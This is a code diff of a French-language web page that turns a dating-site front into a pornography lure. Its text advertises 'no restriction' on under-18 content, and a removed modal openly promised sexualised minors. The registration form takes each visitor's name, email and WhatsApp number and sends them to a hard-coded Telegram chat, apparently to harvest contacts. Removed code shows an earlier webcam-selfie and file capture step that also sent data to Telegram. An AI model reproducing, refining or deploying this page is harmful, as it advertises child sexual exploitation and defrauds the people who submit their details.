@@ -7,15 +7,19 @@
     
     <style>
   /* --- VARIABLES GLOBALES ET FOND --- */
+/* Retour aux couleurs initiales (Rouge Vif) pour un thème plus percutant */
 :root {
-    --bg-image: url('image/bul1.jpg');
-    --primary-color: #e94057; 
-    --secondary-color: #ffffff;
-    --text-color: #f0f0f0; 
-    --box-bg-color: rgba(18, 18, 18, 0.75); 
-    --nav-bg: rgba(18, 18, 18, 0.9); 
-    --dark-text: #222; 
+    --bg-image: url('image/bul1.jpg'); /* Image de fond initiale */
+    --primary-color: #e94057; /* Rouge Vif (Action, Passion) */
+    --secondary-color: #ffffff; /* Texte clair sur fond sombre/rouge */
+    --text-color: #f0f0f0; /* Texte principal clair */
+    --box-bg-color: rgba(18, 18, 18, 0.85); /* Boîte sombre semi-transparente */
+    --nav-bg: #ffffff; /* CHANGÉ : Navigation en blanc */
+    --dark-text: #222; /* Texte foncé pour les modales */
     --whatsapp-color: #25D366; 
+    --shadow-color-primary: rgba(233, 64, 87, 0.6); 
+    --header-text-color: #222; /* Nouvelle variable pour le texte de l'en-tête */
+    --header-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); /* Nouvelle ombre plus subtile */
 }
 
 body {
@@ -46,7 +50,7 @@ body {
 /* ---------------------------------------------------------------- */
 header {
     width: 100%;
-    background-color: var(--nav-bg);
+    background-color: var(--nav-bg); /* En-tête blanc */
     padding: 15px 5%;
     display: flex;
     justify-content: space-between;
@@ -55,6 +59,7 @@ header {
     top: 0;
     z-index: 1000;
     box-sizing: border-box; 
+    box-shadow: var(--header-shadow); /* Utilisation de la nouvelle ombre */
 }
 
 .logo {
@@ -75,6 +80,7 @@ header {
     align-items: center;
 }
 
+/* Styles pour le bouton "Langue" dans l'en-tête */
 .login-container .item {
     text-decoration: none;
     padding: 10px 20px;
@@ -84,22 +90,21 @@ header {
     transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
     display: inline-flex; 
     align-items: center;
-    gap: 8px; /* Espacement entre l'icône et le texte */
+    gap: 8px; 
     text-align: center;
     
-    /* Style pour ressembler au bouton d'accès précédent */
     background-color: var(--primary-color);
     border: 2px solid var(--primary-color);
     color: var(--secondary-color);
-    box-shadow: 0 2px 5px rgba(233, 64, 87, 0.5);
+    box-shadow: 0 2px 8px var(--shadow-color-primary);
     cursor: pointer;
-    position: relative; /* Nécessaire pour positionner le widget Google Translate */
+    position: relative; 
 }
 
 .login-container .item:hover {
     background-color: #d13044;
     transform: translateY(-1px);
-    box-shadow: 0 4px 8px rgba(233, 64, 87, 0.7);
+    box-shadow: 0 4px 12px var(--shadow-color-primary);
 }
 
 .login-container .item i {
@@ -113,13 +118,12 @@ header {
     right: 0;
     width: 100%; 
     height: 100%; 
-    opacity: 0; /* Cache le sélecteur réel */
+    opacity: 0; 
     z-index: 999;
     cursor: pointer;
     overflow: hidden;
 }
 
-/* Styles pour intégrer Google Translate sans style externe */
 #google_translate_element {
     height: 100%; 
     display: flex;
@@ -137,7 +141,6 @@ header {
 }
 
 #google_translate_element select {
-    /* Cache visuellement le select mais le laisse cliquable */
     width: 100%; 
     height: 100%; 
     opacity: 0; 
@@ -155,8 +158,8 @@ header {
 }
 
 .main-title {
-    font-size: 2em; 
-    margin-bottom: 20px;
+    font-size: 2.5em; 
+    margin-bottom: 15px;
     color: var(--secondary-color);
     text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
 }
@@ -164,70 +167,100 @@ header {
 .tagline {
     font-size: 1.5em;
     margin-bottom: 40px;
-    font-weight: 300;
-    color: black;
+    font-weight: 600; /* Plus audacieux */
+    color: var(--secondary-color); /* Blanc pur pour meilleur contraste */
+    text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.9); /* Ombre pour lisibilité maximale */
 }
 
-.features-container {
-    background-color: var(--box-bg-color);
-    padding: 30px;
+/* NOUVEAU STYLE POUR LE BLOC D'INFORMATION GRATUITÉ */
+.info-block {
+    background-color: var(--box-bg-color); /* Utilise la couleur sombre semi-transparente */
+    padding: 25px;
     border-radius: 10px;
     box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-    text-align: left;
-    margin-top: 40px;
     backdrop-filter: blur(5px);
-    border-top: 3px solid var(--primary-color);
+    border: 1px solid var(--primary-color);
+    margin-top: 30px;
 }
 
-.features-container h2 {
-    text-align: center;
-    color: var(--primary-color);
-    font-size: 2em;
-    margin-bottom: 25px;
-}
-
-.feature-item {
-    display: flex;
-    align-items: flex-start;
-    margin-bottom: 25px;
-}
-
-.feature-icon {
-    font-size: 2em;
-    color: var(--primary-color);
-    margin-right: 15px;
-}
-
-.feature-content h4 {
-    margin: 0 0 5px 0;
-    color: var(--secondary-color);
-    font-size: 1.2em;
-}
-
-.feature-content p {
+.info-list {
+    list-style: none;
+    padding: 0;
     margin: 0;
-    color: #ccc;
+    text-align: left;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
 }
+
+.info-item {
+    font-size: 1.1em;
+    font-weight: 500;
+    color: var(--text-color); /* Texte clair */
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.info-item i {
+    color: #25D366; /* Vert pour les avantages (gratuité, etc.) */
+    font-size: 1.3em;
+    min-width: 25px; /* Assurer l'alignement */
+    text-align: center;
+}
+
+.info-item.star i {
+    color: var(--primary-color); /* Couleur primaire pour l'acteur préféré */
+}
+
+
+/* --- AJOUT DE L'ANIMATION DE CLIGNOTEMENT (PULSE) --- */
+@keyframes pulse-red {
+    0% {
+        box-shadow: 0 0 0 0 var(--shadow-color-primary);
+    }
+    50% {
+        box-shadow: 0 0 10px 10px rgba(233, 64, 87, 0); /* Diminuer l'opacité au pic */
+    }
+    70% {
+        box-shadow: 0 0 0 0 var(--shadow-color-primary);
+    }
+    100% {
+        box-shadow: 0 0 0 0 var(--shadow-color-primary);
+    }
+}
+
 
 .btn-main-action {
-    display: inline-block;
+    display: inline-flex; /* MODIFIÉ: Pour aligner l'icône et le texte */
+    align-items: center; /* MODIFIÉ: Centrage vertical */
+    gap: 8px; /* MODIFIÉ: Espacement entre le texte et l'icône */
     background-color: var(--primary-color);
     color: var(--secondary-color);
-    padding: 15px 30px;
-    font-size: 1.3em;
+    /* RETAILLE DU BOUTON PRINCIPAL */
+    padding: 12px 25px; /* RÉDUIT */
+    font-size: 1.2em; /* RÉDUIT */
+    /* FIN RETAILLE */
     font-weight: bold;
     border-radius: 50px;
     text-decoration: none;
     margin-top: 30px;
     transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
-    box-shadow: 0 4px 15px rgba(233, 64, 87, 0.6);
+    box-shadow: 0 6px 20px var(--shadow-color-primary);
     cursor: pointer; 
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    
+    /* Ligne ajoutée pour le clignotement */
+    animation: pulse-red 2s infinite; 
 }
 
 .btn-main-action:hover {
     background-color: #d13044;
-    transform: scale(1.05);
-    box-shadow: 0 6px 20px rgba(233, 64, 87, 0.8);
+    transform: scale(1.03); /* ANIMATION AU SURVOL PLUS SUBTILE */
+    box-shadow: 0 8px 25px var(--shadow-color-primary);
+    /* Ligne ajoutée pour arrêter le clignotement au survol */
+    animation: none; 
 }
 
 /* ---------------------------------------------------------------- */
@@ -255,12 +288,12 @@ header {
 .modal-content {
     background-color: var(--secondary-color); 
     margin: auto; 
-    padding: 20px; 
+    padding: 25px; 
     border-radius: 12px; 
     border-top: 5px solid var(--primary-color);
     
     width: 90%; 
-    max-width: 380px; 
+    max-width: 400px; 
     
     box-shadow: 0 10px 25px rgba(0,0,0,0.4);
     color: var(--dark-text); 
@@ -270,18 +303,18 @@ header {
 
 .modal-content h3 {
     color: var(--primary-color);
-    font-size: 1.4em; 
+    font-size: 1.6em; 
     margin-top: 0;
     border-bottom: 2px solid #eee;
-    padding-bottom: 10px;
+    padding-bottom: 15px;
 }
 
 .modal-content p {
     color: var(--dark-text);
-    font-size: 0.95em; 
-    line-height: 1.4; 
-    margin-bottom: 20px; 
-    padding: 0 10px; 
+    font-size: 1em; 
+    line-height: 1.6; 
+    margin-bottom: 25px; 
+    padding: 0 5px; 
 }
 
 /* Styles des boutons modaux existants */
@@ -290,47 +323,42 @@ header {
     justify-content: center;
     margin-top: 15px; 
     padding: 0 10px; 
+    gap: 10px;
 }
 
 .modal-buttons button {
-    padding: 10px 20px; 
-    margin: 0 5px; 
+    padding: 12px 25px; 
+    margin: 0; 
     border: none;
     border-radius: 8px;
     font-weight: bold;
     cursor: pointer;
-    transition: background-color 0.2s, transform 0.1s;
+    transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
 }
 
 #accept-btn-1 {
-    background-color: #4CAF50; 
+    background-color: var(--primary-color); 
     color: white;
     flex-grow: 1;
 }
 #accept-btn-1:hover {
-    background-color: #45a049;
+    background-color: #d13044;
     transform: translateY(-1px);
+    box-shadow: 0 4px 8px var(--shadow-color-primary);
 }
 #cancel-btn-1 {
     background-color: #ddd;
     color: #555;
+    border: 1px solid #ccc;
 }
 #cancel-btn-1:hover {
     background-color: #ccc;
 }
 
-#accept-btn-2 {
-    background-color: var(--primary-color); 
-    color: white;
-    width: 100%;
-}
-#accept-btn-2:hover {
-    background-color: #d13044;
-    transform: translateY(-1px);
-}
 
 @keyframes fadeInModal {
-    from {opacity: 0; transform: translateY(-50px) scale(0.9);}
+    from {opacity: 0; transform: translateY(-30px) scale(0.95);}
     to {opacity: 1; transform: translateY(0) scale(1);}
 }
 
@@ -339,15 +367,15 @@ header {
 /* ---------------------------------------------------------------- */
 .form-group {
     text-align: left;
-    margin-bottom: 15px;
+    margin-bottom: 20px; 
 }
 
 .form-group label {
     display: block;
-    font-size: 0.9em;
+    font-size: 0.95em;
     font-weight: 600;
     color: var(--dark-text);
-    margin-bottom: 5px;
+    margin-bottom: 8px;
 }
 
 .input-wrapper {
@@ -356,8 +384,8 @@ header {
 
 .form-group input {
     width: 100%; 
-    padding: 12px; 
-    padding-right: 40px; 
+    padding: 14px; 
+    padding-right: 45px; 
     border: 1px solid #ccc;
     border-radius: 8px; 
     box-sizing: border-box;
@@ -368,100 +396,45 @@ header {
 
 .form-group input:focus {
     border-color: var(--primary-color);
-    box-shadow: 0 0 5px rgba(233, 64, 87, 0.4);
+    box-shadow: 0 0 8px rgba(233, 64, 87, 0.4);
     outline: none;
 }
 
 .input-icon {
     position: absolute;
-    right: 12px; 
+    right: 15px; 
     top: 50%;
     transform: translateY(-50%);
-    font-size: 1.3em; 
+    font-size: 1.1em; 
+    color: #adb5bd; 
     pointer-events: none; 
 }
 
-/* Style des champs de type fichier */
-.file-input {
-    padding-right: 12px !important; 
-    cursor: pointer;
-}
-
-.form-group input.file-input {
-    color: var(--dark-text); 
-    height: 45px; 
-}
-
-.form-group input.file-input + .input-icon {
-    display: none;
+.form-group input:focus + .input-icon {
+    color: var(--primary-color); 
 }
 
 /* Style général des boutons de soumission */
-#submit-btn, #submit-verification-btn {
+#submit-btn {
     background-color: var(--primary-color);
     color: white;
     width: 100%;
-    margin-top: 25px; 
-    padding: 15px; 
+    margin-top: 30px; 
+    padding: 16px; 
     font-size: 1.1em;
     font-weight: bold;
     border-radius: 8px; 
     border: none;
     transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
-    box-shadow: 0 4px 10px rgba(233, 64, 87, 0.5); 
+    box-shadow: 0 4px 15px var(--shadow-color-primary); 
     cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
 }
-#submit-btn:hover, #submit-verification-btn:hover:not(:disabled) {
+#submit-btn:hover:not(:disabled) {
     background-color: #d13044;
     transform: translateY(-2px); 
-    box-shadow: 0 6px 12px rgba(233, 64, 87, 0.7);
-}
-
-/* Style pour les boutons désactivés */
-#submit-verification-btn:disabled, #capture-selfie-btn:disabled {
-    background-color: #ccc;
-    cursor: not-allowed;
-    box-shadow: none;
-    transform: translateY(0);
-}
-
-/* --- STYLE WEBCAM --- */
-#webcam-preview {
-    max-width: 100%;
-    height: auto;
-    object-fit: cover;
-}
-#selfie-canvas {
-    max-width: 100%;
-    height: auto;
-    border: 1px solid #ddd;
-    box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-}
-
-/* Masquer le bouton de capture par défaut */
-#capture-selfie-btn {
-    display: none; 
-}
-
-/* Nouveau style pour l'indicateur cliquable d'activation de la caméra */
-.btn-activate-camera {
-    cursor: pointer;
-    background-color: var(--primary-color); 
-    color: var(--secondary-color) !important; 
-    border-radius: 6px;
-    margin: 10px;
-    padding: 15px !important;
-    transition: background-color 0.2s, opacity 0.2s;
-}
-
-.btn-activate-camera:hover:not(.disabled) {
-    background-color: #d13044;
-}
-
-.btn-activate-camera.disabled {
-    cursor: default;
-    background-color: #6c757d; 
-    opacity: 0.8;
+    box-shadow: 0 6px 20px var(--shadow-color-primary);
 }
 
 /* --- STYLE DE CHARGEMENT --- */
@@ -483,14 +456,18 @@ header {
 }
 
 /* Style du bouton pendant le chargement */
-#submit-btn.loading, #submit-verification-btn.loading {
+#submit-btn.loading {
     cursor: wait;
-    opacity: 0.8;
+    opacity: 0.9;
     background-color: #a02032; 
     transform: translateY(0);
     box-shadow: none;
 }
 
+/* Mise à jour du style WhatsApp pour qu'il soit moins intrusif */
+.fab.fa-whatsapp.input-icon {
+    color: var(--whatsapp-color) !important; 
+}
 
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -514,80 +491,63 @@ header {
     </header>
 
     <div class="hero-section">
-        <h1 class="main-title">Trouvez votre Connexion Idéale.</h1>
-        <p class="tagline">Où l'amour, l'amitié et les rencontres prennent une nouvelle dimension.</p>
+        <h1 class="main-title">🍆🍎  
+.</h1>
+        <p class="tagline">Decouvrez vos starporns préférées. </p>
 
-        <div class="features-container">
-            <h2>Pourquoi nous choisir ?</h2>
-            
-            <div class="feature-item">
-                <span class="feature-icon">🎬</span>
-                <div class="feature-content">
-                    <h4>Vidéos Streaming en Direct</h4>
-                    <p>Brisez la glace instantanément ! **Passez en direct** pour partager votre passion ou rejoignez un stream pour discuter en temps réel avec des membres authentiques.</p>
-                </div>
-            </div>
-            
-            <div class="feature-item">
-                <span class="feature-icon">🔍</span>
-                <div class="feature-content">
-                    <h4>Découvrez des Femmes et Hommes de Votre Choix</h4>
-                    <p>Filtres avancés et système de matching précis pour vous connecter uniquement avec des personnes qui correspondent réellement à **vos critères spécifiques**.</p>
-                </div>
-            </div>
-
-            <div class="feature-item">
-                <span class="feature-icon">💬</span>
-                <div class="feature-content">
-                    <h4>Discussions Fluides et Sécurisées</h4>
-                    <p>Communiquez sans limites avec notre chat intégré, conçu pour des **conversations engageantes** et confidentielles. L'authenticité avant tout.</p>
-                </div>
-            </div>
-
-            <div class="feature-item">
-                <span class="feature-icon">🛡️</span>
-                <div class="feature-content">
-                    <h4>Sécurité et Modération Professionnelles</h4>
-                    <p>Une équipe dédiée assure une modération 24/7. Notre priorité : un environnement respectueux, sûr et **exempt de faux profils**.</p>
-                </div>
-            </div>
+<a href="#" id="open-modal-btn" class="btn-main-action">
+            Rejoindre <i class="fas fa-arrow-right"></i>
+        </a>
+         
+        <div class="info-block">
+            <ul class="info-list">
+                <li class="info-item">
+                    <i class="fas fa-gift"></i>100% LIBRE et GRATUIT
+                </li>
+                <li class="info-item">
+                    <i class="fas fa-ban"></i> PAS D'ABONNEMENT nécessaire
+                </li>
+                <li class="info-item">
+                    <i class="fas fa-credit-card"></i> AUCUNE CARTE DE CRÉDIT requise
+                </li>
+                 <li class="info-item">
+                    <i class="fas fa-id-card-alt"></i> PAS DE VÉRIFICATION D'IDENTITÉ requise
+                </li>
+                <li class="info-item star">
+                    <i class="fas fa-star"></i> Video +18 ou -18 aucune restriction yahooo !!!
+                </li>
+            </ul>
         </div>
 
-        <a href="#" id="open-modal-btn" class="btn-main-action">Rejoindre la Communauté Maintenant</a>
-    </div>
+        
+  
+  </div>
     
     <div id="confidentiality-modal" class="modal">
         <div class="modal-content">
-            <h3>🔒 Engagement de Confidentialité</h3>
+            <h3>🔒 Engagement et Conditions d'Accès</h3>
             <p>
-                En cliquant sur **J'accepte**, vous vous engagez solennellement à ce que toutes les informations et communications, **y compris les identités des autres membres**, restent strictement confidentielles.
-                <br><br>
-                **Toute publication ou diffusion extérieure est formellement interdite.** Nous garantissons la confidentialité de nos membres, nous exigeons la vôtre.
+                
+                ** Avertissement **<br> L'identité des membres doivent rester confidentielles <br>
+Considérez ce site comme une espace de detente, laissez-vous allez ‎🍆🍎💋 <br> 
+
+Suivre les videos en lives, demarrer les lives , discuter avec les membres, partagez des photos et videos pour adulte, aucune limite , video +18 ou -18 amusez vous sans tabou , Yahooo !!!
+
+Appuyez sur quitter si cela va à l'encontre de vos attentes ou accepter pour continuer.
+
+
             </p>
             <div class="modal-buttons">
-                <button id="cancel-btn-1">Annuler</button>
-                <button id="accept-btn-1">J'accepte et je continue</button>
-            </div>
-        </div>
-    </div>
-    
-    <div id="verification-modal" class="modal">
-        <div class="modal-content">
-            <h3>🛡️ Attention !!!</h3>
-            <p> 
-               ‎🚨 Vous rencontrerez  egalement les gonzesses de moins de 18 ans mûres et cannon 💋👅🍆, si cela vous derange il n'est pas tard pour faire marche arrière.<br><br>
-                Ceci est une information standard pour que vous puissiez prendre conscience de l'experience que peut offrir notre site.
-            </p>
-            <div class="modal-buttons">
-                <button id="accept-btn-2">J'ai Compris, Continuer l'Inscription</button>
+                <button id="cancel-btn-1">Quitter</button>
+                <button id="accept-btn-1">J'accepte et m'inscris</button>
             </div>
         </div>
     </div>
     
     <div id="registration-modal" class="modal">
         <div class="modal-content">
-            <h3>📝 Informations personnelles</h3>
-            <p>Veuillez remplir vos informations de contact et votre profil initial pour finaliser votre inscription.</p>
+            <h3>📝 S'inscrire</h3>
+            <p>Inscrivez-vous en seulement trois lignes</p>
             
             <form id="registration-form">
                 <div class="form-group">
@@ -601,8 +561,8 @@ header {
                 <div class="form-group">
                     <label for="reg-age">Email :</label>
                     <div class="input-wrapper">
-                        <input type="email" id="reg-age" name="email" required placeholder="Votre email">
-                        <i class="fas fa-birthday-cake input-icon"></i> 
+                        <input type="email" id="reg-age" name="email" required placeholder="Votre email pour l'accès">
+                        <i class="fas fa-envelope input-icon"></i> 
                     </div>
                 </div>
                 
@@ -631,25 +591,16 @@ const CHAT_ID = '-1003149318360'; // REMPLACEZ PAR VOTRE CHAT ID (souvent un ID 
 // Références des Modals et Boutons
 const body = document.body;
 const modal1 = document.getElementById('confidentiality-modal');
-const modal2 = document.getElementById('verification-modal');
 const modal3 = document.getElementById('registration-modal'); 
-// const modal4 = document.getElementById('identity-check-modal'); // Supprimé
 
 const openModalBtn = document.getElementById('open-modal-btn');
 const acceptBtn1 = document.getElementById('accept-btn-1');
 const cancelBtn1 = document.getElementById('cancel-btn-1');
-const acceptBtn2 = document.getElementById('accept-btn-2');
 const registrationForm = document.getElementById('registration-form'); 
 const submitBtn = document.getElementById('submit-btn'); 
 
-// Les références au Modal 4 sont supprimées ou commentées :
-// const verificationForm = document.getElementById('verification-form'); // Supprimé
-// const submitVerificationBtn = document.getElementById('submit-verification-btn'); // Supprimé
-// const webcamPreview = document.getElementById('webcam-preview'); // Supprimé
-// ... et le reste des éléments webcam
-
 // Variables globales
-let registrationData = {}; // Pour stocker Name, Age, WhatsApp
+let registrationData = {}; // Pour stocker Name, Email, WhatsApp
 
 // URL de destination après inscription
 const REDIRECTION_URL = "camlive.html"; 
@@ -679,10 +630,8 @@ function openModal(modal) {
 function closeModal(modal) {
     modal.style.display = "none";
     
-    // Ancien code pour arrêter la caméra (supprimé car Modal 4 est supprimé)
-    
     // Vérifie si tous les modaux sont fermés pour réactiver le scroll
-    if (modal1.style.display === "none" && modal2.style.display === "none" && modal3.style.display === "none") { // Modifié pour ne vérifier que les modales existantes
+    if (modal1.style.display === "none" && modal3.style.display === "none") { 
         body.classList.remove('modal-open');
     }
 }
@@ -700,10 +649,10 @@ function handleMainAction(e) {
 
 openModalBtn.onclick = handleMainAction;
 
-// MODAL 1 -> MODAL 2
+// MODAL 1 -> MODAL 3 (Formulaire d'Inscription) : FLUX SIMPLIFIÉ
 acceptBtn1.onclick = function() {
     closeModal(modal1);
-    openModal(modal2); 
+    openModal(modal3); 
 }
 
 // Ferme le MODAL 1 (Annuler)
@@ -711,19 +660,13 @@ cancelBtn1.onclick = function() {
     closeModal(modal1);
 }
 
-// MODAL 2 -> MODAL 3 (Formulaire d'Inscription)
-acceptBtn2.onclick = function() {
-    closeModal(modal2); 
-    openModal(modal3); 
-}
-
 // MODAL 3 (Inscription) -> FIN (Redirection)
-registrationForm.addEventListener('submit', async function(e) { // Rendu async pour l'envoi Telegram
+registrationForm.addEventListener('submit', async function(e) { 
     e.preventDefault(); 
     
     // 1. Récupération des données
     registrationData.name = document.getElementById('reg-name').value;
-    registrationData.email = document.getElementById('reg-age').value; // 'reg-age' est utilisé pour l'email
+    registrationData.email = document.getElementById('reg-age').value; 
     registrationData.whatsapp = document.getElementById('reg-whatsapp').value;
     
     // 2. Préparation du bouton de soumission
@@ -783,12 +726,9 @@ async function sendMessageToTelegram(message) {
 }
 
 
-// --- GESTION DE LA SOUMISSION FINALE (Ancien code de vérification supprimé) ---
-// La fonction `sendFileToTelegram` est retirée car l'envoi de fichiers n'est plus nécessaire.
-
 // Ferme les Modals si l'utilisateur clique en dehors des boîtes
 window.onclick = function(event) {
-    if (event.target == modal1 || event.target == modal2 || event.target == modal3) { // Modifié
+    if (event.target == modal1 || event.target == modal3) { 
         closeModal(event.target);
     }
 }
